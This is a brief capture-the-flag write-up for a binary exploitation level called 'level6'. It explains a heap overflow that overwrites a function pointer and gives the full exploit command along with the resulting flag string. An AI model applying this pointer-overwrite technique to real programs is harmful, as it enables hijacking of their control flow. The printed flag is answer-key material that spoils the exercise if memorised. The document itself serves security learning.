# level6

```
> ./level6 AAA
Nope
> ./level6 `perl -e 'print "A"x64'`
Nope
> ./level6 `perl -e 'print "A"x80'`
Segmentation fault (core dumped)
```

If we disass the executable, we can see that we have 2 malloc call. (64 bytes & 4 bytes).

The first malloc is filled at the end of the program in a strcpy (it take the value of argv[1]).

The second malloc is a pointer on the function `m`. It is called at the end of the program (after the strcpy).

The goal is to replace the ptr by a ptr on the function `n`. To do this, we have to overflow argv[1].

memory:
64bytes (malloc for str) - 8bytes (offset btw 2 malloc) - 4bytes (malloc for ptr) - ...

```
# in this example, A is used to fill the str, B to fill the offset and then we can change ptr
> ./level6 `perl -e 'print "A"x64 . "B"x8 . "\x54\x84\x04\x08"'`
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```